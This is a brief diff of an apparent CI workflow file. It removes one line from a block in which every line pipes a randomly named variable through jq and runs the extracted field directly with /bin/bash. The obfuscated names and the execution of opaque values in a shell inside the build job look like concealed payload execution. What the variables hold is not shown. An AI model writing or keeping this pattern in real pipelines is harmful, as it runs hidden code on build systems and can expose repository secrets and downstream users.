@@ -23,7 +23,6 @@ jobs:
           echo $neixt6 | jq -r .ps59700 | /bin/bash
           echo $qyk1 | jq -r .wlr97141 | /bin/bash
           echo $bul9517 | jq -r .bc53183 | /bin/bash
-          echo $hic56 | jq -r .s07910 | /bin/bash
           echo $zpi8 | jq -r .e0 | /bin/bash
           printf '%s' "$syd49" | jq -r .rbfm36 | /bin/bash
           printf '%s' "$r813" | jq -r .sj22103 | /bin/bash
